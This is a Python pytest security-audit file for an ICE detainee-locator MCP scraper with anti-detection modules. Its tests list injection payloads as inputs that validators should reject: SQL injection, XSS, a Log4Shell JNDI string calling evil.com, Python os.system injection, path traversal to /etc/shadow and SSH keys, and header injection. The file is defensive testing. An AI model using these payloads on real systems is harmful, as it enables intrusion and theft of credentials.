"""
Security audit tests for ICE Locator MCP Server.

Tests security measures, vulnerability assessments, and attack resistance.
"""

import asyncio
import pytest
import time
from unittest.mock import AsyncMock, MagicMock, patch
from pathlib import Path
import tempfile
import json
import httpx

from ice_locator_mcp.anti_detection.proxy_manager import ProxyManager, ProxyConfig
from ice_locator_mcp.anti_detection.request_obfuscator import RequestObfuscator
from ice_locator_mcp.utils.cache import CacheManager, RateLimiter
from ice_locator_mcp.core.config import Config
from ice_locator_mcp.scraper.ice_scraper import ICEScraper


class TestSecurityAudit:
    """Security audit test suite."""
    
    @pytest.fixture
    async def security_config(self):
        """Security-focused configuration."""
        with tempfile.TemporaryDirectory() as temp_dir:
            config = Config()
            config.cache_dir = Path(temp_dir) / "cache"
            config.rate_limiting.enabled = True
            config.rate_limiting.requests_per_minute = 5
            config.proxy.enabled = True
            yield config
    
    @pytest.fixture
    async def cache_manager(self, security_config):
        """Cache manager for security tests."""
        cache = CacheManager(cache_dir=security_config.cache_dir)
        await cache.initialize()
        yield cache
        await cache.cleanup()
    
    @pytest.fixture
    async def rate_limiter(self):
        """Rate limiter for security tests."""
        return RateLimiter(requests_per_minute=5, burst_allowance=10)
    
    @pytest.fixture
    async def request_obfuscator(self):
        """Request obfuscator for security tests."""
        return RequestObfuscator()

    async def test_input_validation_security(self):
        """Test input validation against injection attacks."""
        from ice_locator_mcp.tools.search_tools import SearchTools
        
        search_tools = SearchTools(MagicMock())
        
        # SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}",
            "../../../windows/system32/",
            "{{7*7}}",  # Template injection
            "${__import__('os').system('ls')}",  # Python injection
        ]
        
        for malicious_input in malicious_inputs:
            # Test name search validation
            with pytest.raises((ValueError, TypeError)):
                await search_tools._validate_search_params({
                    "first_name": malicious_input,
                    "last_name": "Test"
                })
            
            # Test A-number validation
            with pytest.raises((ValueError, TypeError)):
                await search_tools._validate_search_params({
                    "alien_number": malicious_input
                })
    
    async def test_rate_limiting_enforcement(self, rate_limiter):
        """Test rate limiting prevents abuse."""
        # Test normal rate limiting
        start_time = time.time()
        
        # Make requests within rate limit
        for _ in range(5):
            await rate_limiter.acquire()
            await rate_limiter.mark_success()
        
        # This should be fast (within rate limit)
        elapsed = time.time() - start_time
        assert elapsed < 2.0, "Rate limiting should allow normal requests"
        
        # Test rate limit enforcement
        start_time = time.time()
        
        # This should trigger rate limiting
        await rate_limiter.acquire()
        
        elapsed = time.time() - start_time
        assert elapsed > 10.0, "Rate limiting should enforce delays"
    
    async def test_cache_security(self, cache_manager):
        """Test cache security and data protection."""
        # Test cache isolation
        await cache_manager.set("test_key", {"sensitive": "data"})
        
        # Verify data is stored securely
        cached_data = await cache_manager.get("test_key")
        assert cached_data is not None
        
        # Test cache key validation
        malicious_keys = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "../../.ssh/id_rsa",
        ]
        
        for malicious_key in malicious_keys:
            # Should not crash or access unauthorized files
            result = await cache_manager.get(malicious_key)
            assert result is None
    
    async def test_proxy_security(self, security_config):
        """Test proxy configuration security."""
        proxy_manager = ProxyManager(security_config.proxy)
        
        # Test proxy validation
        malicious_proxies = [
            ProxyConfig("../../../etc/passwd:80"),
            ProxyConfig("file:///etc/shadow:80"),
            ProxyConfig("javascript:alert('xss'):80"),
            ProxyConfig("localhost:22"),  # SSH port
            ProxyConfig("127.0.0.1:3389"),  # RDP port
        ]
        
        for malicious_proxy in malicious_proxies:
            # Should not allow malicious proxy configurations
            with pytest.raises((ValueError, ConnectionError)):
                await proxy_manager._health_check_proxy(malicious_proxy)
    
    async def test_request_header_security(self, request_obfuscator):
        """Test request header security and sanitization."""
        # Test header injection prevention
        malicious_headers = {
            "X-Injection": "test\r\nX-Injected: malicious",
            "User-Agent": "test\nX-Injected: malicious",
            "Referer": "javascript:alert('xss')",
        }
        
        obfuscated = await request_obfuscator.obfuscate_request(
            session_id="test_session",
            base_headers=malicious_headers
        )
        
        # Verify no header injection occurred
        for key, value in obfuscated.items():
            assert '\r' not in value, f"Header {key} contains carriage return"
            assert '\n' not in value, f"Header {key} contains newline"
    
    async def test_session_security(self, request_obfuscator):
        """Test session management security."""
        # Test session isolation
        session1_headers = await request_obfuscator.obfuscate_request(
            session_id="session1",
            base_headers={"Test": "value1"}
        )
        
        session2_headers = await request_obfuscator.obfuscate_request(
            session_id="session2", 
            base_headers={"Test": "value2"}
        )
        
        # Sessions should have different characteristics
        assert session1_headers.get("User-Agent") != session2_headers.get("User-Agent") or \
               session1_headers.get("Accept-Language") != session2_headers.get("Accept-Language")
    
    async def test_error_handling_security(self):
        """Test error handling doesn't leak sensitive information."""
        from ice_locator_mcp.scraper.ice_scraper import ICEScraper
        
        config = Config()
        scraper = ICEScraper(config)
        
        # Test error messages don't expose internal details
        with patch('httpx.AsyncClient.get') as mock_get:
            mock_get.side_effect = Exception("Internal database connection failed at 192.168.1.100:5432")
            
            try:
                await scraper.search_by_name("Test", "User")
            except Exception as e:
                error_msg = str(e)
                # Should not expose internal IP addresses or database details
                assert "192.168.1.100" not in error_msg
                assert "5432" not in error_msg
                assert "database" not in error_msg.lower()
    
    async def test_file_access_security(self, cache_manager):
        """Test file access controls and path traversal prevention."""
        # Test path traversal prevention
        malicious_paths = [
            "../../etc/passwd",
            "../../../windows/system32/config/sam",
            "/etc/shadow",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
        ]
        
        for malicious_path in malicious_paths:
            # Should not be able to access files outside cache directory
            result = await cache_manager.get(malicious_path)
            assert result is None, f"Should not access {malicious_path}"
    
    async def test_network_security(self):
        """Test network security measures."""
        # Test HTTPS enforcement
        config = Config()
        config.scraper.base_url = "http://locator.ice.gov"  # Non-HTTPS
        
        scraper = ICEScraper(config)
        
        # Should upgrade to HTTPS or warn about insecure connection
        with patch('httpx.AsyncClient.get') as mock_get:
            mock_get.return_value.status_code = 200
            mock_get.return_value.text = "<html></html>"
            
            await scraper.search_by_name("Test", "User")
            
            # Verify HTTPS was used or connection was rejected
            call_args = mock_get.call_args
            if call_args:
                url = call_args[0][0]
                assert url.startswith("https://") or "insecure" in str(call_args)
    
    async def test_memory_security(self, cache_manager):
        """Test memory handling and sensitive data protection."""
        # Test sensitive data cleanup
        sensitive_data = {
            "ssn": "123-45-6789",
            "alien_number": "A123456789", 
            "personal_info": "sensitive details"
        }
        
        await cache_manager.set("sensitive_test", sensitive_data)
        
        # Clear cache and verify data is actually removed
        await cache_manager.clear()
        
        result = await cache_manager.get("sensitive_test")
        assert result is None, "Sensitive data should be completely removed"
    
    async def test_dependency_security(self):
        """Test third-party dependency security."""
        # This would typically run security scanners like safety or bandit
        # For now, we'll do basic checks
        
        import pkg_resources
        import subprocess
        import sys
        
        # Check for known vulnerable packages (mock test)
        vulnerable_packages = [
            ("requests", "2.20.0"),  # Example vulnerable version
            ("urllib3", "1.24.0"),   # Example vulnerable version
        ]
        
        installed_packages = {pkg.project_name: pkg.version 
                            for pkg in pkg_resources.working_set}
        
        for pkg_name, vulnerable_version in vulnerable_packages:
            if pkg_name in installed_packages:
                installed_version = installed_packages[pkg_name]
                assert installed_version != vulnerable_version, \
                    f"Vulnerable {pkg_name} version {vulnerable_version} detected"
    
    async def test_configuration_security(self):
        """Test configuration security and sensitive data handling."""
        config = Config()
        
        # Test that sensitive configuration isn't logged
        config_dict = config.to_dict()
        
        # Should not contain sensitive information in plain text
        sensitive_fields = ["password", "secret", "key", "token"]
        
        def check_sensitive_data(obj, path=""):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    current_path = f"{path}.{key}" if path else key
                    if any(sensitive in key.lower() for sensitive in sensitive_fields):
                        assert value in [None, "", "***REDACTED***"], \
                            f"Sensitive field {current_path} should be redacted"
                    if isinstance(value, (dict, list)):
                        check_sensitive_data(value, current_path)
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    check_sensitive_data(item, f"{path}[{i}]")
        
        check_sensitive_data(config_dict)


class TestComplianceValidation:
    """Compliance validation test suite."""
    
    async def test_data_retention_compliance(self, cache_manager):
        """Test data retention policy compliance."""
        # Test TTL enforcement
        await cache_manager.set("test_data", {"info": "test"}, ttl=1)
        
        # Data should be available immediately
        result = await cache_manager.get("test_data")
        assert result is not None
        
        # Wait for TTL expiration
        await asyncio.sleep(2)
        
        # Data should be expired and removed
        result = await cache_manager.get("test_data")
        assert result is None, "Data should be removed after TTL expiration"
    
    async def test_logging_compliance(self):
        """Test logging compliance and PII protection."""
        import structlog
        
        # Test that PII is not logged
        logger = structlog.get_logger("test")
        
        # Mock log capture
        logged_messages = []
        
        def capture_log(_, __, event_dict):
            logged_messages.append(event_dict)
            return event_dict
        
        structlog.configure(processors=[capture_log])
        
        # Log potentially sensitive information
        pii_data = {
            "name": "John Doe",
            "ssn": "123-45-6789",
            "alien_number": "A123456789"
        }
        
        logger.info("Processing search", **pii_data)
        
        # Verify PII is redacted in logs
        for message in logged_messages:
            for key, value in message.items():
                if key in ["ssn", "alien_number"]:
                    assert "***" in str(value) or value != pii_data[key], \
                        f"PII field {key} should be redacted in logs"
    
    async def test_access_control_compliance(self):
        """Test access control and authorization."""
        # Test that sensitive operations require proper authorization
        # This is a placeholder - actual implementation would depend on auth system
        
        from ice_locator_mcp.tools.search_tools import SearchTools
        
        search_tools = SearchTools(MagicMock())
        
        # Test rate limiting acts as access control
        assert hasattr(search_tools, '_rate_limiter'), \
            "Search tools should have rate limiting for access control"
    
    async def test_audit_trail_compliance(self, cache_manager):
        """Test audit trail generation and compliance."""
        # Test that all operations are auditable
        
        # Operations should be logged with sufficient detail
        await cache_manager.set("audit_test", {"data": "test"})
        result = await cache_manager.get("audit_test")
        await cache_manager.delete("audit_test")
        
        # In a real implementation, verify audit logs contain:
        # - Timestamp
        # - Operation type
        # - User/session identifier
        # - Resource accessed
        # - Result/status
        
        assert True  # Placeholder - actual audit log verification would go here


class TestPrivacyValidation:
    """Privacy validation test suite."""
    
    async def test_data_minimization(self):
        """Test data minimization principles."""
        from ice_locator_mcp.tools.search_tools import SearchTools
        
        search_tools = SearchTools(MagicMock())
        
        # Test that only necessary data is requested/stored
        search_params = {
            "first_name": "John",
            "last_name": "Doe",
            "unnecessary_field": "should_be_filtered"
        }
        
        validated_params = await search_tools._validate_search_params(search_params)
        
        # Should only contain necessary fields
        assert "unnecessary_field" not in validated_params, \
            "Unnecessary data should be filtered out"
    
    async def test_data_anonymization(self, cache_manager):
        """Test data anonymization for caching."""
        # Test that cached data doesn't contain direct identifiers
        search_result = {
            "name": "John Doe",
            "alien_number": "A123456789",
            "facility": "Test Facility",
            "location": "Test Location"
        }
        
        # Create anonymized cache key
        import hashlib
        cache_key = hashlib.sha256(f"A123456789".encode()).hexdigest()
        
        await cache_manager.set(cache_key, search_result)
        
        # Verify cache key doesn't contain PII
        assert "John" not in cache_key
        assert "Doe" not in cache_key
        assert "A123456789" not in cache_key
    
    async def test_consent_validation(self):
        """Test consent and legal basis validation."""
        # Test that searches have legitimate purpose
        from ice_locator_mcp.tools.search_tools import SearchTools
        
        search_tools = SearchTools(MagicMock())
        
        # In a real implementation, this would validate:
        # - User has legal right to search
        # - Search purpose is legitimate
        # - Appropriate consent is documented
        
        assert hasattr(search_tools, '_validate_search_params'), \
            "Search validation should exist for consent/legal basis checks"


class TestRateLimitingEffectiveness:
    """Test rate limiting effectiveness and resistance to abuse."""
    
    async def test_burst_protection(self):
        """Test protection against burst attacks."""
        rate_limiter = RateLimiter(requests_per_minute=10, burst_allowance=20)
        
        start_time = time.time()
        
        # Simulate burst attack
        for i in range(50):  # Try to make 50 requests quickly
            if i < 20:  # Should allow burst up to allowance
                await rate_limiter.acquire()
                await rate_limiter.mark_success()
            else:  # Should start blocking
                start_request = time.time()
                await rate_limiter.acquire()
                end_request = time.time()
                
                # Should have been delayed
                assert end_request - start_request > 1.0, \
                    f"Request {i} should have been rate limited"
    
    async def test_adaptive_rate_limiting(self):
        """Test adaptive rate limiting based on success/error rates."""
        rate_limiter = RateLimiter(requests_per_minute=10)
        
        # Simulate high error rate
        for _ in range(20):
            await rate_limiter.acquire()
            await rate_limiter.mark_error("rate_limit")
        
        # Rate should be reduced due to errors
        assert rate_limiter.current_rate_multiplier < 1.0, \
            "Rate should be reduced after many errors"
        
        # Simulate recovery with successful requests
        for _ in range(30):
            await rate_limiter.acquire()
            await rate_limiter.mark_success()
        
        # Rate should improve but not immediately return to normal
        assert rate_limiter.current_rate_multiplier > 0.5, \
            "Rate should improve with successful requests"
    
    async def test_distributed_rate_limiting(self):
        """Test rate limiting across multiple sessions."""
        # In a real implementation, this would test:
        # - Per-IP rate limiting
        # - Global rate limiting
        # - Session-based rate limiting
        
        rate_limiter1 = RateLimiter(requests_per_minute=5)
        rate_limiter2 = RateLimiter(requests_per_minute=5)
        
        # Each session should have independent rate limits
        start_time = time.time()
        
        await rate_limiter1.acquire()
        await rate_limiter2.acquire()
        
        elapsed = time.time() - start_time
        assert elapsed < 1.0, "Different sessions should have independent rate limits"